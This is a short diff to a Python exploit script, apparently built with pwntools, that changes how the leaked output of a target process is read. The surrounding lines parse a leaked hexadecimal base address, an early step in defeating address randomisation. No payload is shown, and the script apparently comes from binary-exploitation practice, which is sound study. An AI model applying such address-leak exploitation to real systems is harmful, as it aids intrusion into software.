@@ -13,7 +13,7 @@ if __name__ == "__main__":
 
     # I read a line from STDOUT until the hexadecimal prefix is reached.
     # This information is not useful, so it is dropped.
-    process_to_exploit.recvuntil(b"0x")
+    debug_useless_info = process_to_exploit.recvuntil(b"0x")
 
     # I read in the base address.
     base_address_as_hex = process_to_exploit.recvuntil(b".", True)
